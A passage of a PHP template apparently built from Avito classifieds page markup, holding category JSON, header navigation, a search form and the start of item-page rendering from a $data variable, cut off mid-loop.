путешествия","subs":[],"url":"\/rossiya\/bilety_i_puteshestviya?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":33,"params":{},"count":1},{"id":53,"mcId":53,"name":"Велосипеды","subs":[],"url":"\/rossiya\/velosipedy?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":34,"params":{},"count":1},{"id":54,"mcId":54,"name":"Книги и журналы","subs":[],"url":"\/rossiya\/knigi_i_zhurnaly?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":83,"params":{},"count":1},{"id":55,"mcId":55,"name":"Коллекционирование","subs":[],"url":"\/rossiya\/kollektsionirovanie?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":36,"params":{},"count":1},{"id":52,"mcId":52,"name":"Музыкальные инструменты","subs":[],"url":"\/rossiya\/muzykalnye_instrumenty?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":38,"params":{},"count":1},{"id":56,"mcId":56,"name":"Охота и рыбалка","subs":[],"url":"\/rossiya\/ohota_i_rybalka?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":102,"params":{},"count":1},{"id":57,"mcId":57,"name":"Спорт и отдых","subs":[],"url":"\/rossiya\/sport_i_otdyh?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":39,"params":{},"count":1}],"url":"\/rossiya\/hobbi_i_otdyh?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":1,"categoryId":7,"params":{},"count":8},{"id":4,"mcId":4,"name":"Животные","subs":[{"id":24,"mcId":24,"name":"Собаки","subs":[],"url":"\/rossiya\/sobaki?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":89,"params":{},"count":1},{"id":25,"mcId":25,"name":"Кошки","subs":[],"url":"\/rossiya\/koshki?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":90,"params":{},"count":1},{"id":26,"mcId":26,"name":"Птицы","subs":[],"url":"\/rossiya\/ptitsy?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":91,"params":{},"count":1},{"id":27,"mcId":27,"name":"Аквариум","subs":[],"url":"\/rossiya\/akvarium?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":92,"params":{},"count":1},{"id":28,"mcId":28,"name":"Другие животные","subs":[],"url":"\/rossiya\/drugie_zhivotnye?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":93,"params":{},"count":1},{"id":29,"mcId":29,"name":"Товары для животных","subs":[],"url":"\/rossiya\/tovary_dlya_zhivotnyh?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":94,"params":{},"count":1}],"url":"\/rossiya\/zhivotnye?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":1,"categoryId":35,"params":{},"count":7},{"id":9,"mcId":9,"name":"Для бизнеса","subs":[{"id":59,"mcId":59,"name":"Готовый бизнес","subs":[],"url":"\/rossiya\/gotoviy_biznes?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":116,"params":{},"count":1},{"id":60,"mcId":60,"name":"Оборудование для бизнеса","subs":[],"url":"\/rossiya\/oborudovanie_dlya_biznesa?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":40,"params":{},"count":1}],"url":"\/rossiya\/dlya_biznesa?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":1,"categoryId":8,"params":{},"count":3}],"url":"\/rossiya?view=gallery&cd=1","current":true,"currentParent":false,"opened":false,"level":0,"categoryId":null,"params":{},"count":82}],"commonCategories":{"Obj_Category_VERTICAL_AUTO":{"slug":null,"id":0},"Obj_Category_VERTICAL_REALTY":{"slug":"transport","id":1},"Obj_Category_VERTICAL_JOB":{"slug":"dlya_doma_i_dachi","id":2},"Obj_Category_VERTICAL_SERVICES":{"slug":null,"id":3},"Obj_Category_ROOT_TRANSPORT":{"slug":"transport","id":1},"Obj_Category_ROOT_REAL_ESTATE":{"slug":"nedvizhimost","id":4},"Obj_Category_ROOT_JOB":{"slug":"rabota","id":110},"Obj_Category_JOB_VACANCIES":{"slug":"vakansii","id":111},"Obj_Category_JOB_RESUME":{"slug":"rezume","id":112},"Obj_Category_ROOT_SERVICES":{"slug":"predlozheniya_uslug","id":114},"Obj_Category_TRANSPORT_CARS":{"slug":"avtomobili","id":9},"Money_Notification_View_Refund_Site_FROM_PARAM_NAME":{"slug":null,"id":"from"},"Money_Notification_View_Refund_Site_FROM_PAGE_POPUP":{"slug":"lichnye_veschi","id":5}},"constant":{"Obj_Category_VERTICAL_AUTO":0,"Obj_Category_VERTICAL_REALTY":1,"Obj_Category_VERTICAL_JOB":2,"Obj_Category_VERTICAL_SERVICES":3,"Obj_Category_ROOT_TRANSPORT":1,"Obj_Category_ROOT_REAL_ESTATE":4,"Obj_Category_ROOT_JOB":110,"Obj_Category_JOB_VACANCIES":111,"Obj_Category_JOB_RESUME":112,"Obj_Category_ROOT_SERVICES":114,"Obj_Category_TRANSPORT_CARS":9,"Money_Notification_View_Refund_Site_FROM_PARAM_NAME":"from","Money_Notification_View_Refund_Site_FROM_PAGE_POPUP":5},"country":{"country_slug":"rossiya","site_name":"Авито","delivery":{"name":"Авито Доставка"},"currency_sign":"₽"},"luri":"rossiya","verticalId":4,"orderAllCategories":[{"id":0,"values":[1,2,8]},{"id":1,"values":[4,6]},{"id":2,"values":[110,114,7]},{"id":3,"values":[5,35]}],"now":1564154670,"_dashboard":{},"_webvisor":{},"ssrMode":"prod"}'><div class="header-navigation-basic-i28MZ header-container-basic"><div class="header-navigation-basic-inner-226Ce  header-container-basic-inner"><div class="header-navigation-logo-2aaur"><span class="logo-root-fxfjv"><a class="logo-logo-2YITg" href="https://avito.ru/" title=&quot;Авито &amp;mdash; сайт объявлений&quot;></a></span></div><div class="header-navigation-categories-87Lbp"><div><ul class="simple-with-more-rubricator-category-list-1B8Ve"><li class="simple-with-more-rubricator-category-item-1oRcq "><a class="simple-with-more-rubricator-link-27kbj simple-with-more-rubricator-category-link-3ngHO"
 href="https://avito.ru/rossiya/transport"
 data-marker="navigation/link"
 data-category-id="1"
 >Авто</a></li><li class="simple-with-more-rubricator-category-item-1oRcq "><a class="simple-with-more-rubricator-link-27kbj simple-with-more-rubricator-category-link-3ngHO"
 href="https://avito.ru/rossiya/nedvizhimost"
 data-marker="navigation/link"
 data-category-id="4"
 >Недвижимость</a></li><li class="simple-with-more-rubricator-category-item-1oRcq "><a class="simple-with-more-rubricator-link-27kbj simple-with-more-rubricator-category-link-3ngHO"
 href="https://avito.ru/rossiya/rabota"
 data-marker="navigation/link"
 data-category-id="110"
 >Работа</a></li><li class="simple-with-more-rubricator-category-item-1oRcq "><a class="simple-with-more-rubricator-link-27kbj simple-with-more-rubricator-category-link-3ngHO"
 href="https://avito.ru/rossiya/predlozheniya_uslug"
 data-marker="navigation/link"
 data-category-id="114"
 >Услуги</a></li><li class="simple-with-more-rubricator-category-item-1oRcq"><button class="simple-with-more-rubricator-link-27kbj simple-with-more-rubricator-category-link-3ngHO simple-with-more-rubricator-category-link_more-3cOco"
 data-marker="navigation/more-button"
 type="button" data-location-id="">ещё</button></li></ul><div
 class="simple-with-more-rubricator-more-popup-2fDTp"
 data-marker="navigation/more-popup"><div
 class="simple-with-more-rubricator-more-popup-arrow-13hlF"
 ></div><div><div class="simple-with-more-rubricator-header-categories-all-2Yo_9 js-header-more-content"><div class="simple-with-more-rubricator-header-categories-all__all-1ElCY"><a href="https://avito.ru/rossiya">Все категории</a></div><div
 class="simple-with-more-rubricator-header-categories-all__column-wrapper-Ognfc"
 ><div class="simple-with-more-rubricator-header-categories-all__column-3KQAH"><ul class="simple-with-more-rubricator-header-categories-all__list-3UY03"><li class=" simple-with-more-rubricator-header-categories-all__item_parent-yGrsI"><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/nedvizhimost?view=gallery&amp;cd=1"
 data-category-id="5"
 >Недвижимость</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/kvartiry?view=gallery&amp;cd=1"
 data-category-id="30"
 >Квартиры</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/komnaty?view=gallery&amp;cd=1"
 data-category-id="31"
 >Комнаты</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/doma_dachi_kottedzhi?view=gallery&amp;cd=1"
 data-category-id="32"
 >Дома, дачи, коттеджи</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/zemelnye_uchastki?view=gallery&amp;cd=1"
 data-category-id="33"
 >Земельные участки</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/garazhi_i_mashinomesta?view=gallery&amp;cd=1"
 data-category-id="34"
 >Гаражи и машиноместа</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/kommercheskaya_nedvizhimost?view=gallery&amp;cd=1"
 data-category-id="35"
 >Коммерческая недвижимость</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/nedvizhimost_za_rubezhom?view=gallery&amp;cd=1"
 data-category-id="36"
 >Недвижимость за рубежом</a></li></ul><ul class="simple-with-more-rubricator-header-categories-all__list-3UY03"><li class=" simple-with-more-rubricator-header-categories-all__item_parent-yGrsI"><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/rabota?view=gallery&amp;cd=1"
 data-category-id="10"
 >Работа</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/vakansii?view=gallery&amp;cd=1"
 data-category-id="61"
 >Вакансии</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/rezume?view=gallery&amp;cd=1"
 data-category-id="62"
 >Резюме</a></li></ul><ul class="simple-with-more-rubricator-header-categories-all__list-3UY03"><li class=" simple-with-more-rubricator-header-categories-all__item_parent-yGrsI"><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/zhivotnye?view=gallery&amp;cd=1"
 data-category-id="4"
 >Животные</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/sobaki?view=gallery&amp;cd=1"
 data-category-id="24"
 >Собаки</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/koshki?view=gallery&amp;cd=1"
 data-category-id="25"
 >Кошки</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/ptitsy?view=gallery&amp;cd=1"
 data-category-id="26"
 >Птицы</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/akvarium?view=gallery&amp;cd=1"
 data-category-id="27"
 >Аквариум</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/drugie_zhivotnye?view=gallery&amp;cd=1"
 data-category-id="28"
 >Другие животные</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/tovary_dlya_zhivotnyh?view=gallery&amp;cd=1"
 data-category-id="29"
 >Товары для животных</a></li></ul></div><div class="simple-with-more-rubricator-header-categories-all__column-3KQAH"><ul class="simple-with-more-rubricator-header-categories-all__list-3UY03"><li class=" simple-with-more-rubricator-header-categories-all__item_parent-yGrsI"><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/lichnye_veschi?view=gallery&amp;cd=1"
 data-category-id="6"
 >Личные вещи</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/odezhda_obuv_aksessuary?view=gallery&amp;cd=1"
 data-category-id="37"
 >Одежда, обувь, аксессуары</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/detskaya_odezhda_i_obuv?view=gallery&amp;cd=1"
 data-category-id="38"
 >Детская одежда и обувь</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/tovary_dlya_detey_i_igrushki?view=gallery&amp;cd=1"
 data-category-id="39"
 >Товары для детей и игрушки</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/chasy_i_ukrasheniya?view=gallery&amp;cd=1"
 data-category-id="40"
 >Часы и украшения</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/krasota_i_zdorove?view=gallery&amp;cd=1"
 data-category-id="41"
 >Красота и здоровье</a></li></ul><ul class="simple-with-more-rubricator-header-categories-all__list-3UY03"><li class=" simple-with-more-rubricator-header-categories-all__item_parent-yGrsI"><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/bytovaya_elektronika?view=gallery&amp;cd=1"
 data-category-id="7"
 >Бытовая электроника</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/audio_i_video?view=gallery&amp;cd=1"
 data-category-id="43"
 >Аудио и видео</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/igry_pristavki_i_programmy?view=gallery&amp;cd=1"
 data-category-id="44"
 >Игры, приставки и программы</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/nastolnye_kompyutery?view=gallery&amp;cd=1"
 data-category-id="45"
 >Настольные компьютеры</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/noutbuki?view=gallery&amp;cd=1"
 data-category-id="46"
 >Ноутбуки</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/orgtehnika_i_rashodniki?view=gallery&amp;cd=1"
 data-category-id="47"
 >Оргтехника и расходники</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/planshety_i_elektronnye_knigi?view=gallery&amp;cd=1"
 data-category-id="48"
 >Планшеты и электронные книги</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/telefony?view=gallery&amp;cd=1"
 data-category-id="49"
 >Телефоны</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/tovary_dlya_kompyutera?view=gallery&amp;cd=1"
 data-category-id="42"
 >Товары для компьютера</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/fototehnika?view=gallery&amp;cd=1"
 data-category-id="50"
 >Фототехника</a></li></ul></div><div class="simple-with-more-rubricator-header-categories-all__column-3KQAH"><ul class="simple-with-more-rubricator-header-categories-all__list-3UY03"><li class=" simple-with-more-rubricator-header-categories-all__item_parent-yGrsI"><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="#"
 data-category-id=""
 ></a></li></ul><ul class="simple-with-more-rubricator-header-categories-all__list-3UY03"><li class=" simple-with-more-rubricator-header-categories-all__item_parent-yGrsI"><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="#"
 data-category-id=""
 ></a></li></ul><ul class="simple-with-more-rubricator-header-categories-all__list-3UY03"><li class=" simple-with-more-rubricator-header-categories-all__item_parent-yGrsI"><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/hobbi_i_otdyh?view=gallery&amp;cd=1"
 data-category-id="8"
 >Хобби и отдых</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/bilety_i_puteshestviya?view=gallery&amp;cd=1"
 data-category-id="51"
 >Билеты и путешествия</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/velosipedy?view=gallery&amp;cd=1"
 data-category-id="53"
 >Велосипеды</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/knigi_i_zhurnaly?view=gallery&amp;cd=1"
 data-category-id="54"
 >Книги и журналы</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/kollektsionirovanie?view=gallery&amp;cd=1"
 data-category-id="55"
 >Коллекционирование</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/muzykalnye_instrumenty?view=gallery&amp;cd=1"
 data-category-id="52"
 >Музыкальные инструменты</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/ohota_i_rybalka?view=gallery&amp;cd=1"
 data-category-id="56"
 >Охота и рыбалка</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/sport_i_otdyh?view=gallery&amp;cd=1"
 data-category-id="57"
 >Спорт и отдых</a></li></ul></div><div class="simple-with-more-rubricator-header-categories-all__column-3KQAH"><ul class="simple-with-more-rubricator-header-categories-all__list-3UY03"><li class=" simple-with-more-rubricator-header-categories-all__item_parent-yGrsI"><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/dlya_doma_i_dachi?view=gallery&amp;cd=1"
 data-category-id="3"
 >Для дома и дачи</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/bytovaya_tehnika?view=gallery&amp;cd=1"
 data-category-id="20"
 >Бытовая техника</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/mebel_i_interer?view=gallery&amp;cd=1"
 data-category-id="21"
 >Мебель и интерьер</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/posuda_i_tovary_dlya_kuhni?view=gallery&amp;cd=1"
 data-category-id="22"
 >Посуда и товары для кухни</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/produkty_pitaniya?view=gallery&amp;cd=1"
 data-category-id="18"
 >Продукты питания</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/remont_i_stroitelstvo?view=gallery&amp;cd=1"
 data-category-id="23"
 >Ремонт и строительство</a></li><li class=""><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="https://avito.ru/rossiya/rasteniya?view=gallery&amp;cd=1"
 data-category-id="19"
 >Растения</a></li></ul><ul class="simple-with-more-rubricator-header-categories-all__list-3UY03"><li class=" simple-with-more-rubricator-header-categories-all__item_parent-yGrsI"><a class="simple-with-more-rubricator-header-categories-all__link-k_Jr3 js-header-categories-all__link"
 href="#"
 data-category-id=""
 ></a></li></ul></div></div></div></div></div></div></div></div></div></div> </div>
       <div class="layout-internal col-12  ">
     
<?php if ($data !== false){ ?>
<div class="b-search-form  b-search-form_item"> <form
 id="search_form"
 class="search-form__form js-search-form-catalog js-search-form"
 autocomplete="off"
 action="https://avito.ru/search"
 method="post"
 data-show-counter=''
 data-show-counter-exposure=''
 data-initial-request-counter='1'
 data-total-count=''
 data-marker="search-form"> <div class="search-form-main-controls js-search-form-main-controls">
  <input type="hidden" class="js-search-map" name="map" value="">
      <input type="hidden" class="js-token" name="token[1557687262804]" value="771545b75723a41a">
   
 <div class="search-form__row search-form__row_1 clearfix">
  <div class="search-form__category"> <div class="form-select-v2">
                                                                                                                              
 <select id="category" name="category_id"
 class="js-search-form-category js-category-indent sub-selected"
 data-marker="search-form/category" style="text-indent:0;"> <option style="" value="" selected class="js-root"> Любая категория</option>
   <option value="1" class="js-root"  >Транспорт</option>
    <option value="9" >&nbsp; &nbsp;Автомобили</option>
    <option value="14" >&nbsp; &nbsp;Мотоциклы и мототехника</option>
    <option value="81" >&nbsp; &nbsp;Грузовики и спецтехника</option>
    <option value="11" >&nbsp; &nbsp;Водный транспорт</option>
    <option value="10" >&nbsp; &nbsp;Запчасти и аксессуары</option>
    <option value="4" class="js-root"  >Недвижимость</option>
    <option value="24" >&nbsp; &nbsp;Квартиры</option>
    <option value="23" >&nbsp; &nbsp;Комнаты</option>
    <option value="25" >&nbsp; &nbsp;Дома, дачи, коттеджи</option>
    <option value="26" >&nbsp; &nbsp;Земельные участки</option>
    <option value="85" >&nbsp; &nbsp;Гаражи и машиноместа</option>
    <option value="42" >&nbsp; &nbsp;Коммерческая недвижимость</option>
    <option value="86" >&nbsp; &nbsp;Недвижимость за рубежом</option>
    <option value="110" class="js-root"  >Работа</option>
    <option value="111" >&nbsp; &nbsp;Вакансии</option>
    <option value="112" >&nbsp; &nbsp;Резюме</option>
    <option value="113" class="js-root"  >Услуги</option>
    <option value="114" >&nbsp; &nbsp;Предложение услуг</option>
    <option value="5" class="js-root"  >Личные вещи</option>
    <option value="27" >&nbsp; &nbsp;Одежда, обувь, аксессуары</option>
    <option value="29" >&nbsp; &nbsp;Детская одежда и обувь</option>
    <option value="30" >&nbsp; &nbsp;Товары для детей и игрушки</option>
    <option value="28" >&nbsp; &nbsp;Часы и украшения</option>
    <option value="88" >&nbsp; &nbsp;Красота и здоровье</option>
    <option value="2" class="js-root"  >Для дома и дачи</option>
    <option value="21" >&nbsp; &nbsp;Бытовая техника</option>
    <option value="20" >&nbsp; &nbsp;Мебель и интерьер</option>
    <option value="87" >&nbsp; &nbsp;Посуда и товары для кухни</option>
    <option value="82" >&nbsp; &nbsp;Продукты питания</option>
    <option value="19" >&nbsp; &nbsp;Ремонт и строительство</option>
    <option value="106" >&nbsp; &nbsp;Растения</option>
    <option value="6" class="js-root"  >Бытовая электроника</option>
    <option value="32" >&nbsp; &nbsp;Аудио и видео</option>
    <option value="97" >&nbsp; &nbsp;Игры, приставки и программы</option>
    <option value="31" >&nbsp; &nbsp;Настольные компьютеры</option>
    <option value="98" >&nbsp; &nbsp;Ноутбуки</option>
    <option value="99" >&nbsp; &nbsp;Оргтехника и расходники</option>
    <option value="96" >&nbsp; &nbsp;Планшеты и электронные книги</option>
    <option value="84" >&nbsp; &nbsp;Телефоны</option>
    <option value="101" >&nbsp; &nbsp;Товары для компьютера</option>
    <option value="105" >&nbsp; &nbsp;Фототехника</option>
    <option value="7" class="js-root"  >Хобби и отдых</option>
    <option value="33" >&nbsp; &nbsp;Билеты и путешествия</option>
    <option value="34" >&nbsp; &nbsp;Велосипеды</option>
    <option value="83" >&nbsp; &nbsp;Книги и журналы</option>
    <option value="36" >&nbsp; &nbsp;Коллекционирование</option>
    <option value="38" >&nbsp; &nbsp;Музыкальные инструменты</option>
    <option value="102" >&nbsp; &nbsp;Охота и рыбалка</option>
    <option value="39" >&nbsp; &nbsp;Спорт и отдых</option>
    <option value="35" class="js-root"  >Животные</option>
    <option value="89" >&nbsp; &nbsp;Собаки</option>
    <option value="90" >&nbsp; &nbsp;Кошки</option>
    <option value="91" >&nbsp; &nbsp;Птицы</option>
    <option value="92" >&nbsp; &nbsp;Аквариум</option>
    <option value="93" >&nbsp; &nbsp;Другие животные</option>
    <option value="94" >&nbsp; &nbsp;Товары для животных</option>
    <option value="8" class="js-root"  >Для бизнеса</option>
    <option value="116" >&nbsp; &nbsp;Готовый бизнес</option>
    <option value="40" >&nbsp; &nbsp;Оборудование для бизнеса</option>
   </select> </div> </div>
  <div class="search-form__submit"> <input
 type="submit"
 value="Найти"
 class="search button button-origin js-search-button"
 data-marker="search-form/submit-button"> </div>
                                 <div class="search-form__direction "> <div id="directions" class="form-select-v2 param " data-marker="search-form/directions"> <select
  name="district[]" id="directions-select"
 class="directions"  data-filter="1"> <option data-prev-alias="district" value="">Район</option> </select>
  <select multiple class="hidden-input-for-tab" id="directions-multiple"></select> </div> <div
 class="search-form__change-filters disabled js-change-filters"
  data-current-tab="district"
 data-selected-elements='null'
 ></div> </div>
   <div class="search-form__radius"> <div
 class="
 form-select-v2
 js-search-form-radius
  hidden"> <select
  disabled
  id="radius"
 name="radius"
 class="js-search-form-radius-select"
 title="Радиус поиска"
 data-marker="search-form/radius">
  <option
 value="0"
  >
  Радиус
  </option>
  <option
 value="100"
  >
  +100 км  </option>
  <option
 value="200"
  selected
  >
  +200 км  </option>
  <option
 value="300"
  >
  +300 км  </option>
  <option
 value="400"
  >
  +400 км  </option>
  <option
 value="500"
  >
  +500 км  </option>
  <option
 value="1000"
  >
  +1000 км  </option>
  </select> </div> <div
 class="search-form__change-radius disabled js-change-radius"
  hidden  ></div> </div>
    <div class="search-form__location">
   <div class="form-select-v2"> <select
 id="region"
 name="location_id"
 class="js-search-form-region"
 data-marker="search-form/region">
 <option
 value="621540"
 data-parent-id=""
   selected >По всей России</option><option
 value="637640"
 data-parent-id="621540"
  data-metro-map="1"  >Москва</option><option
 value="653240"
 data-parent-id="621540"
  data-metro-map="1"  >Санкт-Петербург</option><option
 value="624840"
 data-parent-id="624770"
   >Волгоград</option><option
 value="654070"
 data-parent-id="653700"
   >Екатеринбург</option><option
 value="650400"
 data-parent-id="650130"
   >Казань</option><option
 value="633540"
 data-parent-id="632660"
   >Краснодар</option><option
 value="640860"
 data-parent-id="640310"
   >Нижний Новгород</option><option
 value="641780"
 data-parent-id="641470"
   >Новосибирск</option><option
 value="642320"
 data-parent-id="642020"
   >Омск</option><option
 value="644200"
 data-parent-id="643700"
   >Пермь</option><option
 value="652000"
 data-parent-id="651110"
   >Ростов-на-Дону</option><option
 value="653040"
 data-parent-id="652560"
   >Самара</option><option
 value="646600"
 data-parent-id="645790"
   >Уфа</option><option
 value="661420"
 data-parent-id="660710"
   >Челябинск</option> <option value="0">Выбрать другой...</option> </select> </div> <div
 class="search-form__change-location disabled js-change-location"
 data-location-id="621540"
 data-location-name="По всей России"
 data-category-id="39"
 ></div> </div>
  <div class="search-form__key-words"> <div id="search_holder" class="search-form__key-words__search-holder"> <input id="search"
 type="text" name="name" value=""
 placeholder="Поиск по объявлениям"
  spellcheck="false" data-suggest="true" maxlength="100"
 data-suggest-delay=""
 data-marker="search-form/suggest"> </div> </div> </div> <div
    class="search-form__row search-form__row_2 js-pre-filters hidden"
 id="pre-filters"
 data-delivery-categories='null'
 data-delivery-locations='null'>
  <label class="form-checkbox" data-marker="search-form/by-title"> <input type="checkbox" class="js-by-title" name="bt" > <span class="form-checkbox__label">только в названиях</span> </label> <label class="form-checkbox" data-marker="search-form/with-images"> <input type="checkbox" class="js-with-images" name="i" > <span class="form-checkbox__label">только с фото</span> </label> <label class="form-checkbox js-search-form-delivery hidden"> <input class="js-search-form-delivery-checkbox" type="checkbox" name="d" > <span class="form-checkbox__label"> <span class="search-form-delivery-regions">&nbsp;</span>
 только с доставкой
 </span> </label>
     <label
 class="save-link_wrapper save-link_add "
 data-is-saved=""
 >
  <a
 href="https://avito.ru/autosearch/add"
 class="save-link js-search-form-save-link"
 data-action="add"
 >Сохранить поиск</a>
  </label>
   </div> </div>
  </form>
 </div>
 </div>
<?php } ?>
 <div class="item-view-page-layout item-view-page-layout_content">
  <?php if ($data === false){ ?>
  <div class="l-content clearfix">
    <div class="b-404"> <h1>Ой! Такой страницы на нашем сайте нет :(</h1> <p>Наверное, вы ошиблись при наборе адреса или перешли по неверной ссылке.</p> <p>Не расстраивайтесь, выход есть!<br>Перейдите <a href="https://avito.ru">на главную страницу</a> или <a href="//www.avito.ru/nizhniy_novgorod">на страницу объявлений</a>.</p> <i class="i i-404"></i> </div>
  </div>
  <?php } else { ?>

<div class="l-content clearfix">

<div class="item-navigation clearfix">
 
    <div class="breadcrumbs js-breadcrumbs ">
      <div class="breadcrumbs js-breadcrumbs"> 
        <?php foreach ($data["item"]["breadcrumbs"] as $i => $breadcrumb){ ?>
